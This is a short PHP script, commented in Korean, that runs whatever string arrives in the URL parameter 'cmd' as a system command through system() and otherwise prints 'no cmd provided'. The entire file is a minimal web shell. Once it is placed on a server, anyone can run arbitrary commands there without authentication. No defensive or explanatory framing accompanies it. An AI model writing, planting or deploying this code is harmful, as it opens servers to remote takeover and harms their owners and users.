<?php
  // 파라미터 cmd로 받은 문자열을 시스템 명령어로 실행
  if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
  } else {
    echo "no cmd provided";
  }
?>
